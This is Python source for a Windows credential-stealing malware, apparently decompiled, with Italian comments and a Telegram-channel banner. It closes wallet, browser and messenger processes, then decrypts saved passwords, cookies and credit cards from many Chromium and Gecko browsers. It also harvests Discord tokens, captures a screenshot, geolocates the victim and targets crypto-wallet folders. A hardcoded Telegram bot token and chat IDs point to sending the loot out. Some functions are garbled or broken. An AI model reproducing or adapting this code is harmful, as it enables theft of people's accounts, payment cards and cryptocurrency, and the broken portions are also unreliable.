import os
import json
import base64
import sqlite3
import shutil
import getpass
import requests
import glob
import time
import platform
import ctypes
import re
import string
import pyzipper
import io
import random
import datetime
import psutil
from Crypto.Cipher import AES
import pywintypes
from win32crypt import CryptUnprotectData
from PIL import ImageGrab

def installed_ch_browser(ch_browser):
    results = []
    
    for browser,path in ch_browser.items():
        if os.path.exists(path):
            results.append(browser)
    
    return results
    
def get_ch_master_key(path):
    c = None
    os_crypt = None
    
    try:
        f = open(os.path.join(path, 'Local State'), "r", encoding='utf-8')
        c = f.read()
    except FileNotFoundError:
        os_crypt = None
    
    if 'os_crypt' not in c:
        os_crypt = None
    else:
        try:
            local_state = json.loads(c)
            ch_master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            ch_master_key = ch_master_key[5:]
            ch_master_key = CryptUnprotectData(ch_master_key, None, None, None, 0)
            
            os_crypt = ch_master_key
        except Exception:
            os_crypt = None
    return os_crypt
    
def decrypt_ch_password(buff, ch_master_key):
    try:
        starts = buff.decode('utf8', 'ignore')[:3]

        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:-16]
            cipher = AES.new(ch_master_key[1], AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass.decode('utf8', 'ignore')
            return decrypted_pass
    except (UnicodeDecodeError, ValueError, IndexError):
        return None
    except Exception:
        return None
        
def get_gck_basepath(browser_type):
    try:
        if browser_type == 'Firefox':
            basepath = csRMNG + "\\Mozilla\\Firefox"
            return basepath
        elif browser_type == 'Pale Moon':
            basepath = csRMNG + '\\Moonchild Productions\\Pale Moon'
            return basepath
        elif browser_type == 'SeaMonkey':
            basepath = csRMNG + '\\Mozilla\\SeaMonkey'
            return basepath
        elif browser_type == 'Waterfox':
            basepath = csRMNG + '\\Waterfox'
            return basepath
        else:
            return None
    except KeyError:
        return None
        
def gck_initialization():
    ff_nsslib_paths = ['C:\\Program Files\\Mozilla Firefox\\nss3.dll', 'C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll']
    pm_nsslib_paths = ['C:\\Program Files\\Pale Moon\\nss3.dll', 'C:\\Program Files (x86)\\Pale Moon\\nss3.dll']
    sm_nsslib_paths = ['C:\\Program Files\\SeaMonkey\\nss3.dll', 'C:\\Program Files (x86)\\SeaMonkey\\nss3.dll']
    wf_nsslib_paths = ['C:\\Program Files\\Waterfox\\nss3.dll', 'C:\\Program Files (x86)\\Waterfox\\nss3.dll']

    for ff_path in ff_nsslib_paths:
        if os.path.exists(ff_path):
            ff_nsslib_path = ff_path
            break
    else:
        ff_nsslib_path = None

    for pm_path in pm_nsslib_paths:
        if os.path.exists(pm_path):
            pm_nsslib_path = pm_path
            break
    else:
        pm_nsslib_path = None

    for sm_path in sm_nsslib_paths:
        if os.path.exists(sm_path):
            sm_nsslib_path = sm_path
            break
    else:
        sm_nsslib_path = None

    for wf_path in wf_nsslib_paths:
        if os.path.exists(wf_path):
            wf_nsslib_path = wf_path
            break
    else:
        wf_nsslib_path = None

    ff_nsslib = ctypes.CDLL(ff_nsslib_path) if ff_nsslib_path else None
    pm_nsslib = ctypes.CDLL(pm_nsslib_path) if pm_nsslib_path else None
    sm_nsslib = ctypes.CDLL(sm_nsslib_path) if sm_nsslib_path else None
    wf_nsslib = ctypes.CDLL(wf_nsslib_path) if wf_nsslib_path else None

    return ff_nsslib, pm_nsslib, sm_nsslib, wf_nsslib

    
def get_gck_profiles(basepath, browser_type):
    profiles_path = os.path.join(basepath, 'profiles.ini')

    try:
        with open(profiles_path, 'r') as f:
            data = f.read()
    except (FileNotFoundError, IOError):
        return []

    if browser_type == 'Firefox':
        pattern = re.compile('^Path=.+(?s:.)$', re.M)
    elif browser_type == 'Pale Moon':
        pattern = re.compile('^Path=.+(?s:.)$', re.M)
    elif browser_type == 'SeaMonkey':
        pattern = re.compile('^Path=.+(?s:.)$', re.M)
    elif browser_type == 'Waterfox':
        pattern = re.compile('^Path=.+(?s:.)$', re.M)
    else:
        return []
    
    profiles = []
    for p in re.finditer(pattern, data):
        path = os.path.join(basepath,p.group(0)[5:].rstrip())
        profiles.append(path)
    
    return profiles
    
def decrypt_gck_data(encrypted_data, nsslib):
    try:
        data = base64.b64decode(encrypted_data)
        cipher_text = ctypes.create_string_buffer(data)
        plain_text = ctypes.create_string_buffer(len(data))

        # Call PK11SDR_Decrypt from nsslib
        nsslib.PK11SDR_Decrypt(ctypes.byref(cipher_text), ctypes.byref(plain_text), None)

        if len(plain_text) != 0:
            decrypted_data = ctypes.string_at(plain_text, len(data)).decode('utf-8')
            return decrypted_data

    except Exception:
        pass  # Handle exceptions as needed

    return None
    
def decrypt_gck_profiles(nsslib, profiles):
    decrypted_profiles = []

    for profile in profiles:
        try:
            logins = os.path.join(profile, 'logins.json')

            if not os.path.isfile(logins):
                continue

            if nsslib is None is not nsslib:
                nsslib.NSS_Shutdown()

            nsslib.NSS_Init(profile.encode('utf-8'))

            if 0 != len(nsslib):
                nsslib.NSS_Shutdown()

            with open(logins, 'r') as f:
                data = json.load(f)

            decrypted_profiles.append(
                [profile for data in data['logins']
                 if (nsslib is not None and nsslib.NSS_Shutdown(),
                     nsslib is not None and nsslib.NSS_Shutdown(),
                     0)[0]]
            )

        except Exception:
            if nsslib is not None:
                nsslib.NSS_Shutdown()

            raise

        finally:
            if nsslib is not None:
                nsslib.NSS_Shutdown()

    return decrypted_profiles
    
def format_expiry(expiry):
    if expiry == '0':
        return "Session"
    expiry = int(expiry)
    dt = datetime.datetime.fromtimestamp(expiry)
    return dt.strftime('%d.%m.%Y, %H:%M:%S')
    
def get_ch_login_data(path, profile, ch_master_key):
    login_db = f"{path}\\{profile}\\Login Data"
    result = (
        '*********************************************\n'
        '*   _______ ___ ___ _____  ______ _______   *\n'
        '*  |   |   |   |   |     \\|   __ \\   _   |  *\n'
        '*  |       |\\     /|  --  |      <       |  *\n'
        '*  |___|___| |___| |_____/|___|__|___|___|  *\n'
        '*                                           *\n'
        '*         https://t.me/mranontools         *\n'
        '*                                           *\n'
        '*********************************************'
    )
    count = 0

    if not os.path.exists(login_db):
        return count,result
    #Copia in temp il file login_db. 
    #Il browser non deve essere in esecuzione altrimenti l'accesso risulta negato
    temp_path = os.path.join(csTMP, "login_db")
    shutil.copy(login_db, temp_path)

    try:
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()

        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        
        for row in cursor.fetchall():
                if row[0] and row[1] and row[2]:
                    #Decritta le password salvate nel browser
                    password = decrypt_ch_password(row[2], ch_master_key)
                    if password:
                        result += f'\n\nURL: {row[0]}\nLogin: {row[1]}\nPassword: {password}'
                        count += 1
        #cursor.close()
        #conn.close()
    except Exception:
        pass

    finally:
        cursor.close()
        conn.close()
    os.remove(temp_path)

    return count,result
    
def save_gck_login_data(decrypted_profiles, profile_name, browser_name):
    count = 0
    login_data = []

    for profile_data in decrypted_profiles:
        for profile, logins in profile_data.items():
            if not logins:
                continue

            login_data.append(
                '*********************************************\n'
                '*   _______ ___ ___ _____  ______ _______   *\n'
                '*  |   |   |   |   |     \\|   __ \\   _   |  *\n'
                '*  |       |\\     /|  --  |      <       |  *\n'
                '*  |___|___| |___| |_____/|___|__|___|___|  *\n'
                '*                                           *\n'
                '*         https://t.me/mranontools         *\n'
                '*                                           *\n'
            )

            for login in logins:
                login_data.append(
                    f'\n\nURL: {login["Hostname"]}\n'
                    f'Login: {login["Username"]}\n'
                    f'Password: {login["Password"]}\n'
                )
                count += 1

    if count > 0:
        dir_path = os.path.join(csBD,'Gecko')
        if not os.path.exists(dir_path):
            os.mkdir(dir_path)

        browser_path = os.path.join(dir_path, f'Saved Passwords ({profile_name}).cs')
        with open(browser_path, 'w') as logins_file:
            logins_file.writelines(login_data)

    return count
    
def get_ch_cookies(path, profile, ch_master_key):
    cookie_db = f'{path}\\{profile}\\Network\\Cookies'
    result = ''
    count = 0
    
    if not os.path.exists(cookie_db):
        return result, count
    else:
        try:
            shutil.copy(cookie_db, os.path.join(csTMP,'cookie_db'))
        except PermissionError:
            return result,count
        
        try:
            conn = sqlite3.connect(f"{csTMP}\\cookie_db")
            cursor = conn.cursor()

            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3] or not row[4]:
                    continue

                cookie = decrypt_ch_password(row[3], ch_master_key)
                
                expiry_date = datetime.datetime.fromtimestamp((row[4] - 11644473600000000)/1000000)
                expiry_date = expiry_date.strftime('%a, %d-%b-%Y %H:%M:%S %Z')
                
                expiry_str = f"{row[0]}\tTRUE\t{row[2]}\tFALSE\t{expiry_date}\t{cookie}\n"

                result += expiry_str
                count += 1
        except Exception:
            pass

        finally:
            if cursor:
                cursor.close()

            if conn:
                conn.close()

        os.remove(f"{csTMP}\\cookie_db")

        return result, count
        
def save_gck_cookies(profiles, profile_name, browser_name):
    count = 0
    cookies_data = []
    conn = None

    try:
        conn = sqlite3.connect(os.path.join(profiles[0], 'cookies.sqlite') + '?mode=ro')
        cursor = conn.cursor()
    except sqlite3.Error:
        count += 4
        return count

    for profile in profiles:
        cookies_db = os.path.join(profile, 'cookies.sqlite')
        if not os.path.isfile(cookies_db):
            continue

        try:
            cursor.execute('SELECT host, path, name, value, expiry FROM moz_cookies')
            cookies = cursor.fetchall()
        except sqlite3.Error:
            count += 2
            continue

        if not cookies:
            count += 2
            continue

        cookies_data.append('\n*********************************************\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \|   __ \   _   |  *\n*  |       |\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/mranontools         *\n*                                           *\n')
        
        for cookie in cookies:
            host, path, name, value, expiry = cookie
            cookies_data.append(f'\n\nHost Key : {host}\nCookie Name : {name}\nPath: {path}\nCookie: {value}\nExpires On: {format_expiry(expiry)}\nExpires On (Unix): {expiry}')

            count += 1

    if count > 0:
        return count

    try:
        dir_path = os.path.join(os.path.join(profiles[0], browser_name))
        browser_path = os.path.join(dir_path, f'Browser Cookies ({profile_name}).cs')
        cookies_file = os.path.join(browser_path, 'cookies.cs')
        
        with open(cookies_file, 'w') as f:
            f.writelines(cookies_data)
    except Exception:
        count += 8
    finally:
        if conn:
            conn.close()

    return count

def get_ch_ccards(path, profile, ch_master_key):
    cards_db = f'{path}{profile}\\Web Data'
    result = ''
    count = 0

    if not os.path.exists(cards_db):
        return result, count

    shutil.copy(f'{cards_db}', os.path.join(csTMP,'cards_db'))

    try:
        conn = sqlite3.connect(os.path.join(csTMP,'cards_db'))
        cursor = conn.cursor()
    except sqlite3.Error:
        count += 4
        return result, count

    try:
        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        rows = cursor.fetchall()

        for row in rows:
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = decrypt_ch_password(row[3], ch_master_key)
            result += f'\n\nCard Name: {row[0]}\nCard Number: {card_number}\nCard Expiration: {row[1]} / {row[2]}\nAdded: {datetime.fromtimestamp(row[4]).strftime("%Y-%m-%d %H:%M:%S")}'
            count += 1
    except sqlite3.Error:
        count += 2
    finally:
        cursor.close()
        conn.close()

    os.remove(os.path.join(csTMP,'cards_db'))
    return result, count
    
def save_gck_ccards(profiles, profile_name, browser_name):
    count = 0
    credit_card_data = []

    for profile in profiles:
        cards_db = os.path.join(profile, 'webappsstore.sqlite')

        if not os.path.isfile(cards_db):
            continue

        try:
            conn = sqlite3.connect(cards_db)
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM webappsstore2 WHERE key LIKE '%cc_number%'")
            cards = cursor.fetchall()
        except sqlite3.Error:
            if 'conn' in locals() and conn:
                conn.close()
            continue
        finally:
            if 'conn' in locals() and conn:
                conn.close()

        if not cards:
            continue

        credit_card_data.append('\n*********************************************\n*   _______ ___ ___ _____  ______ _______   *\n*  |   |   |   |   |     \|   __ \   _   |  *\n*  |       |\     /|  --  |      <       |  *\n*  |___|___| |___| |_____/|___|__|___|___|  *\n*                                           *\n*         https://t.me/mranontools         *\n*                                           *\n')

        for card in cards:
            value = json.loads(card[3])
            credit_card_data.append(
                f'\n\nCard Name: {value["cc_name"]}\nCard Number: {value["cc_number"]}\nCard Expiration: {value["cc_exp_month"]}/{value["cc_exp_year"]}\n\n'
            )
            count += 1

    if count > 0:
        dir_path = os.path.join(os.path.join(profiles[0], browser_name))
        browser_path = os.path.join(dir_path, f'Saved Credit Cards ({profile_name}).cs')
        cards_file = os.path.join(browser_path, 'cards.cs')

        try:
            os.makedirs(dir_path, exist_ok=True)
            os.makedirs(browser_path, exist_ok=True)
            with open(cards_file, 'w') as f:
                f.writelines(credit_card_data)
        except Exception:
            count += 8

    return count
    
def save_ch_results(ch_browser_name, data_type, ch_content):
    if not os.path.exists(csBD):
        os.mkdir(csBD)
        
    if not os.path.exists(csBD+'\\Chronium'):
        os.mkdir(csBD+'\\Chronium')
        
    if not os.path.exists(f'{csBD}\\\\Chronium\\{ch_browser_name}'):
        os.mkdir(f'{csBD}\\\\Chronium\\{ch_browser_name}')
        
    if ch_content is not None:
        f = open(f'{csBD}\\Chronium\\{ch_browser_name}\\{data_type}.cs', "w")
        f.write(ch_content)
        f.close()
        
def decrypt_dc_tokens(buff, master_key):
    try:
        cipher = AES.new(master_key, MODE_GCM, nonce=buff[3:15])
        decrypted_data = cipher.decrypt(buff[15:])
        decoded_data = decrypted_data.decode('utf-8', errors='ignore')
        
        return decoded_data
    except:
        pass
        
def get_all_dc_tokens(dc_token_paths):
    tokens = set()
    dc_token_paths = dc_token_paths.items()  # Assumendo che dc_token_paths sia un dizionario
    cleaned = []

    try:
        for path_name, path in dc_token_paths:
            #Se il browser è nell'elenco
            if path_name in ['7Star', 'Amigo', 'Brave', 'Cent Browser', 'Chrome Canary', 'Epic Privacy Browser', 'Google Chrome', 'Iridium', 'Kometa', 'Microsoft Edge', 'Orbitum', 'Sputnik', 'Torch', 'Uran', 'Vivaldi', 'Yandex']:
                #Ottiene l'elenco dei profili
                path = f'{path}\\Default'
                paths = glob.glob(f'{path}\\Profile*') if os.path.exists(f'{path}\\Local State') else []
                          
                #Per ogni profilo trovato
                for p in paths:
                    lev_db = f'{p}\\Local Storage\\leveldb\\'
                    loc_state = f'{p}\\Local State'

                    if os.path.exists(loc_state):
                        with open(loc_state, 'r') as file:
                            try:
                                key = json.loads(file.read())['os_crypt']['encrypted_key']
                                key = base64.b64decode(key[5:])
                            except Exception:
                                pass

                        try:
                            with open(lev_db + file, 'r', errors='ignore') as files:
                                lines = files.readlines()
                                for x in lines:
                                    x = x.strip()
                                    values = [m.group(1).replace('\\', '') for m in re.findall('dQw4w9WgXcQ:[^.*\[\'(.*)\'\].*$][^"]*', x)]
                                    cleaned.append(values)
                        except Exception:
                            pass

            for token in cleaned:
                decrypted_token = decrypt_dc_tokens(token, key)
                if decrypted_token:
                    tokens.add((decrypted_token, path_name))
    except FileNotFoundError:
        pass

    return tokens
    
def create_header(main_dc_token):
    headers = {'Content-Type': 'application/json'}
    
    if main_dc_token:
        headers.update({'Authorization': main_dc_token})
    
    return headers
    
def get_main_dc_info(tokens):
    if tokens:
        dc_user_name = 'Not Available'
        dc_user_discriminator = '0000'
        dc_phone = 'Not available'
        dc_email = 'Not Available'
        dc_mfa = 'Not Available'
        
        for token in tokens:
            headers = create_header(token)
            
            try:
                response = requests.get(dapi_url, headers=(headers,))
                discord = response.json()
                
                dc_user_name = discord.get('username')
                dc_user_discriminator = discord.get('discriminator')
                dc_phone = discord.get('phone')
                dc_email = discord.get('email')
                dc_mfa = discord.get('mfa_enabled')
            except requests.HTTPError as err:
                if response.status_code == 401:
                    continue
            except Exception as err:
                pass
        return dc_user_name, dc_user_discriminator, dc_phone, dc_email, dc_mfa
    else:
        #tokens = [main_dc_token]
        #return tokens
        return '', '', '', '', ''
    
def csGetEIP():
    csEIP = None
    
    try:
        csEIP = requests.get("https://api.ipify.org").content.decode()
        return csEIP
    except:
        return csEIP
        
def csGI():
    csGID = ''
    
    try:
        csSEIP = csGetEIP()
        response = requests.get(f'https://geolocation-db.com/jsonp/{csSEIP}').text
        response_text = response.replace('callback(', '').replace('})', '}')
        csIData = json.loads(response_text)
        
        csCN = csIData['country_name']
        csCC = csIData['country_code'].lower()
        csCFLG = ''

        if len(csCC) == 2:
            offset = ord('🇦') - ord('A')
            csCFLG = chr(ord(csCC[0].upper()) + offset) + chr(ord(csCC[1].upper()) + offset)

        csGID = f'🦣 Name: {csUN}\n📱 Phone: {dc_phone}\n📬 E-Mail: {dc_email}\n🌏 IP: {csSEIP} ({csCN} {csCFLG})'
    except Exception:
        csGID = f'🦣 Name: {csUN}\n📱 Phone: {dc_phone}\n📬 E-Mail: {dc_email}\n🌏 IP: {csSEIP} (😕 GL-DB)'
    return csGID
# The rest of the bytecode appears to be handling exceptions, but it doesn't seem to affect the main functionality.

    

process_names = ['ArmoryQt.exe',
 'Atomic Wallet.exe',
 'brave.exe',
 'bytecoin-gui.exe',
 'chrome.exe',
 'Coinomi.exe',
 'Discord.exe',
 'DiscordCanary.exe',
 'Element.exe',
 'Exodus.exe',
 'firefox.exe',
 'Guarda.exe',
 'KeePassXC.exe',
 'NordVPN.exe',
 'OpenVPNConnect.exe',
 'seamonkey.exe',
 'Signal.exe',
 'Telegram.exe',
 'filezilla.exe',
 'filezilla-server-gui.exe',
 'keepassxc-proxy.exe',
 'msedge.exe',
 'nordvpn-service.exe',
 'opera.exe',
 'steam.exe',
 'walletd.exe',
 'waterfox.exe',
 'yandex.exe']
#Chiude i processi nella lista precedente se sono in esecuzione sul sistema
for process in psutil.process_iter():
    if process.name().lower() in [name.lower() for name in process_names]:
        try:
            process.terminate()
        except psutil.AccessDenied:
            pass
        except Exception:
            pass
            
bot_token = '6799784870:AAHEU6EUdnAjRcH8Qq0TCokNtVJSL06VmbU'
chat_id_G = '-4056604150'
chat_id_P = '-4056604150'

csTN = 'Hotels'
csWID = '0001'
chat_id_CK = chat_id_G

dapi_url = 'https://discord.com/api/v9/users/@me'
csPFX86 = os.environ["ProgramFiles(x86)"]
csLCL = os.getenv("LOCALAPPDATA")
csRMNG = os.getenv("APPDATA")
csTMP = os.getenv("TEMP")
csUSR = csTMP.split("\\AppData")[0]

csUN = getpass.getuser() #username
csOSN = platform.system() #tipo sistema operativo
csOSR = platform.release() #release
csOSV = platform.version() #versione completa del sistema operativo

csBD = os.path.join(csTMP,'Browser Data')
password_length = 16
max_file_size = 500000

#Effettua uno screenshot del desktop
#e salva il file nella directory temp dell'utente
try:
    screenshot = ImageGrab.grab()
    screenshot_path = os.path.join(csTMP,f'screenshot({csUN}).png') 
    screenshot.save(screenshot_path, 'png', optimize=True, compression_level=9)
except Exception as e:
    print(f'error capturing screenshot: {e}')
    
password = 'Anon@666'.encode()
creation_datetime = datetime.datetime.now()
creation_datetime_str = creation_datetime.strftime('Log Created @ %d.%m.%Y | %H:%M:%S')
categories_order = ['Desktop Wallets', 'Browser Wallets', 'Browser Extensions', 'Messengers', 'VPN Clients', 'Others', 'Gaming', 'Files']

report_path = os.path.join(csTMP, f'Log Report ({csUN}).cs')

ch_browsers = {
    '7Star': csLCL + '\\7Star\\7Star\\User Data',
    'Amigo': csLCL + '\\Amigo\\User Data',
    'Brave': csLCL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Cent Browser': csLCL + '\\CentBrowser\\User Data',
    'Chrome Canary': csLCL + '\\Google\\Chrome SxS\\User Data',
    'Epic Privacy Browser': csLCL + '\\Epic Privacy Browser\\User Data',
    'Google Chrome': csLCL + '\\Google\\Chrome\\User Data',
    'Iridium': csLCL + '\\Iridium\\User Data',
    'Kometa': csLCL + '\\Kometa\\User Data',
    'Microsoft Edge': csLCL + '\\Microsoft\\Edge\\User Data',
    'Opera': csLCL + '\\Opera Software\\Opera Stable',
    'Opera GX': csLCL + '\\Opera Software\\Opera GX Stable',
    'Orbitum': csLCL + '\\Orbitum\\User Data',
    'Sputnik': csLCL + '\\Sputnik\\Sputnik\\User Data',
    'Torch': csLCL + '\\Torch\\User Data',
    'Uran': csLCL + '\\uCozMedia\\Uran\\User Data',
    'Vivaldi': csLCL + '\\Vivaldi\\User Data',
    'Yandex': csLCL + '\\Yandex\\YandexBrowser\\User Data'
}

#Ottiene i nomi dei browser installati sul sistema 
#tra quelli presenti nel dizionario precedente
available_ch_browsers = installed_ch_browser(ch_browsers)

#Ottiene il percorso di default dei browser seguenti
#senza verificare che essi siano effettivamente installati
#I tre browser sono basati sul motore di rendering Gecko
ff_basepath = get_gck_basepath('Firefox')
pm_basepath = get_gck_basepath('Pale Moon')
sm_basepath = get_gck_basepath('SeaMonkey')
wf_basepath = get_gck_basepath('Waterfox')

ff_nsslib, pm_nsslib, sm_nsslib, wf_nsslib = gck_initialization()

#Ottiene il percorso ai profili utente per ognuno
#dei browser indicati
ff_profiles = get_gck_profiles(ff_basepath, 'Firefox')
pm_profiles = get_gck_profiles(pm_basepath, 'Pale Moon')
sm_profiles = get_gck_profiles(sm_basepath, 'SeaMonkey')
wf_profiles = get_gck_profiles(wf_basepath, 'Waterfox')

total_ch_logins_count = 0
total_ch_cookies_count = 0
total_ch_ccards_count = 0
total_gck_logins_count = 0
total_gck_cookies_count = 0
total_gck_ccards_count = 0
total_browser_logins_count = 0
total_browser_cookies_count = 0
total_browser_ccards_count = 0
logins_headers = []
cookies_headers = []
ccards_headers = []

#Per ognuno dei browser installati sul sistema
for browser in available_ch_browsers:
    browser_path = ch_browsers[browser]
    #Ottiene la master_key dal file  Local State
    ch_master_key = get_ch_master_key(browser_path)
    
    #Cerca di ottenere i percorsi ai vari profili trovati per il browser in esame
    profiles_path = os.path.join(browser_path, 'Profile*')
    
    profile_folders = glob.glob(profiles_path)
    
    if len(profile_folders) == 0:
        profiles_path = os.path.join(browser_path, 'Default')
        profile_folders = [profiles_path]
    else:
        profiles_path = os.path.join(browser_path,'Profile*')
        profile_folders = glob.glob(profiles_path)
        
        profiles_path = os.path.join(browser_path, 'Default')
        default_folder = [profiles_path]
        profile_folders = default_folder + profile_folders
    #Per ognuna delle directory profilo trovate    
    for profile_folder in profile_folders:
        if browser == 'Opera' or browser == 'Opera GX':
            profile = ''
            header_name = browser
        else:
            #Recupera il nome file dal percorso completo
            profile = os.path.basename(profile_folder)
            header_name = f'{browser} ({profile})'
            #Decritta le password salvate nel browser in esame
            #recuperando anche il numero totale
            countP, passwords = get_ch_login_data(browser_path, profile, ch_master_key)
            
            if countP > 0:
                logins_headers.append(f'{header_name}: {countP}')
                
            total_ch_logins_count += countP
            #Crea, se non esiste, il percorso in temp "Browser Data\Chronium"
            #Crea una sottodirectory avente il nome del browser in esame
            #Crea al suo interno un file "Saved Passwords(profile).cs" con l'elenco delle password recuperate
            if countP > 0:
                if browser == 'Opera' or browser == 'Opera GX':
                    save_ch_results(browser, 'Saved Passwords', password)
                else:
                    save_ch_results(browser, f'Saved Passwords ({profile})', passwords)
            #Recupera tutti i cookie di sessione e la relativa scadenza
            #Recupera anche il numero totale         
            cookies,countC = get_ch_cookies(browser_path, profile, ch_master_key)

            if browser == 'Opera' or browser == 'Opera GX':
                header_name = browser
            else:
                header_name = f'{browser} ({profile})'
                
            if countC > 0:
                cookies_headers.append(f'{header_name}: {countC})')
            
            total_ch_cookies_count += countC
            #Crea un file nella directory in temp creata in precedenza per le passwords
            #"Browser Cookies(profile).cs" con l'elenco dei cookie recuperati e la relativa scadenza
            if countC > 0:
                if browser == 'Opera' or browser == 'Opera GX':
                    save_ch_results(browser, 'Browser Cookies', cookies)
                else:
                    save_ch_results(browser, f'Browser Cookies ({profile})', cookies)
            #Recupera tutte le informazioni sulle carte di credito salvate nel browser
            #Recupera anche il numero totale        
            cards,countCC = get_ch_ccards(browser_path, profile, ch_master_key)
            
            if browser == 'Opera' or browser == 'Opera GX':
                header_name = browser
            else:
                header_name = f'{browser} ({profile})'
            
            if countCC > 0:
                ccards_headers.append(f'{header_name}: {countCC}')
            
            total_ch_ccards_count += countCC
            #Crea un file nella directory in temp creata in precedenza per le passwords
            #"Saved Credit Cards(profile).cs" con l'elenco delle carte di credito salvate nel browser
            if countCC > 0:
                if browser == 'Opera' or browser == 'Opera GX':
                    save_ch_results(cards, 'Saved Credit Cards', browser)
                else:
                    save_ch_results(cards, f'Saved Credit Cards({profile})', browser)

#Stessa cosa fa per i browser che utilizzano il motore di rendering Gecko
#in quanto utilizzano la libreria nss3.dll per lo storage delle informazioni cifrate
#Salve le medesime informazioni precedenti però al percroso in temp "Browser Data\Gecko"                    
for profile in ff_profiles:
    profile_name = os.path.basename(profile).split(".")[0]
    
    decrypted_profiles = decrypt_gck_profiles(ff_nsslib, [profile])
    ff_logins_count = save_gck_login_data(decrypted_profiles, profile_name, 'Mozilla Firefox')
    
    if ff_logins_count > 0:
        logins_headers.append(f'Mozilla Firefox ({profile_name}): {ff_logins_count}')
    
    total_gck_logins_count += ff_logins_count

    ff_cookies_count = save_gck_cookies([profile], profile_name, 'Mozilla Firefox')
    
    if ff_cookies_count > 0:
        cookies_headers.append(f'Mozilla Firefox ({profile_name}): ff_cookies_count')
    total_gck_cookies_count += ff_cookies_count
    
    ff_ccards_count = save_gck_ccards([profile], profile_name, 'Mozilla Firefox')
    if ff_ccards_count > 0:
        ccards_headers.append(f'Mozilla Firefox ({profile_name}): ff_ccards_count')        
    total_gck_ccards_count += ff_ccards_count
    
for profile in pm_profiles:
    profile_name = os.path.basename(profile).split(".")[0]
    
    decrypted_profiles = decrypt_gck_profiles(pm_nsslib, [profile])
    pm_logins_count = save_gck_login_data(decrypted_profiles, profile_name, 'Pale Moon')
    
    if pm_logins_count > 0:
        logins_headers.append(f'Pale Moon ({profile_name}): pm_logins_count')
    total_gck_logins_count += pm_logins_count
    
    pm_cookies_count = save_gck_cookies([profile], profile_name, 'Pale Moon')
    if pm_cookies_count > 0:
        cookies_headers.append(f'Pale Moon ({profile_name}): {pm_cookies_count}')
        
    total_gck_cookies_count += pm_cookies_count
    
    pm_ccards_count = save_gck_ccards([profile], profile_name, 'Pale Moon')
    if pm_ccards_count > 0:
        ccards_headers.append(f'Pale Moon ({profile_name}): {pm_ccards_count}')
        
    total_gck_ccards_count += pm_ccards_count
    
for profile in sm_profiles:
    profile_name = os.path.basename(profile).split(".")[0]
    
    decrypted_profiles = decrypt_gck_profiles(sm_nsslib, [profile])
    sm_logins_count = save_gck_login_data(decrypted_profiles, profile_name, 'SeaMonkey')
    
    if sm_logins_count > 0:
        logins_headers.append(f'SeaMonkey ({profile_name}): sm_logins_count')
    total_gck_logins_count += sm_logins_count
    
    sm_cookies_count = save_gck_cookies([profile], profile_name, 'SeaMonkey')
    if sm_cookies_count > 0:
        cookies_headers.append(f'SeaMonkey ({profile_name}): {sm_cookies_count}')
        
    total_gck_cookies_count += sm_cookies_count
    
    sm_ccards_count = save_gck_ccards([profile], profile_name, 'SeaMonkey')
    if sm_ccards_count > 0:
        ccards_headers.append(f'Pale Moon ({profile_name}): {sm_ccards_count}')
        
    total_gck_ccards_count += sm_ccards_count
    
for profile in wf_profiles:
    profile_name = os.path.basename(profile).split(".")[0]

    decrypted_profiles = decrypt_gck_profiles(wf_nsslib, [profile])
    wf_logins_count = save_gck_login_data(decrypted_profiles, profile_name, 'Waterfox')
    
    if wf_logins_count > 0:
        logins_headers.append(f'Waterfox ({profile_name}): wf_logins_count')
    total_gck_logins_count += wf_logins_count
    
    wf_cookies_count = save_gck_cookies([profile], profile_name, 'Waterfox')
    if wf_cookies_count > 0:
        cookies_headers.append(f'Waterfox ({profile_name}): {wf_cookies_count}')
        
    total_gck_cookies_count += wf_cookies_count
    
    wf_ccards_count = save_gck_ccards([profile], profile_name, 'Waterfox')
    if wf_ccards_count > 0:
        ccards_headers.append(f'Waterfox ({profile_name}): {wf_ccards_count}')
        
    total_gck_ccards_count += wf_ccards_count
    
total_browser_logins_count = total_ch_logins_count + total_gck_logins_count
total_browser_cookies_count = total_ch_cookies_count + total_gck_cookies_count
total_browser_ccards_count = total_ch_ccards_count + total_gck_ccards_count

# Load constants
category_names = [
    '💵 Desktop Wallets',
    '💸 Browser Wallets',
    '🔐 Browser Extensions',
    '💬 Messengers',
    '🌐 VPN Clients',
    '⚙️ Others',
    '🔫 Gaming',
    '🗄 Files'
]
categories_tuple = ('Desktop Wallets', 'Browser Wallets', 'Browser Extensions', 'Messengers', 'VPN Clients', 'Others', 'Gaming', 'Files')

# Build a dictionary using BUILD_CONST_KEY_MAP
custom_category_names = dict(zip(categories_tuple, category_names))

fixed_paths = {} 
fixed_paths.update({csRMNG+'\\Exodus\\exodus.wallet': {'category':'Desktop Wallets', 'archive_name':'Exodus'}})
fixed_paths.update({csRMNG+'\\Armory': {'category':'Desktop Wallets', 'archive_name':'Bitcoin Armory'}})
fixed_paths.update({csLCL+'\\Coinomi\\Coinomi\\wallets': {'category':'Desktop Wallets', 'archive_name':'Coinomi Wallet'}})
fixed_paths.update({csRMNG+'\\atomic\\Local Storage\\leveldb': {'category':'Desktop Wallets', 'archive_name':'Atomic Wallet'}})
fixed_paths.update({csRMNG+'\\Guarda\\Local Storage\\leveldb': {'category':'Desktop Wallets', 'archive_name':'Guarda'}})
fixed_paths.update({csRMNG+'\\bytecoin': {'category':'Desktop Wallets', 'archive_name':'Bytecoin Wallet'}})
fixed_paths.update({csRMNG+'\\discord\\Local Storage\\leveldb': {'category':'Messenger', 'archive_name':'Discord Canary'}})
fixed_paths.update({csRMNG+'\\Element\\Local Storage\\leveldb': {'category':'Messenger', 'archive_name':'Element'}})
